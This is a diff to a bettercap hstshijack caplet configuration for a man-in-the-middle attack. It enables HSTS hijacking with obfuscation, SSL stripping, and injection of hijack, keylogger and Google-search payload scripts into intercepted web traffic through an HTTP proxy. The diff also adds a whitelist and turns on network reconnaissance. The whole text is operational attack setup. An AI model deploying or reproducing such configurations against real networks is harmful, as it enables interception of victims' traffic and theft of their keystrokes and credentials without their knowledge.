@@ -10,7 +10,10 @@ set hstshijack.ssl.check       true
 #set hstshijack.blockscripts    example.com,*.example.com
 set hstshijack.obfuscate       true
 set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js
+set hstshijack.whitelist       /usr/local/share/bettercap/caplets/hstshijack/whitelist.json
 set hstshijack.ignore          captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com,www.msftconnecttest.com
+
+net.recon on
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
 http.proxy on
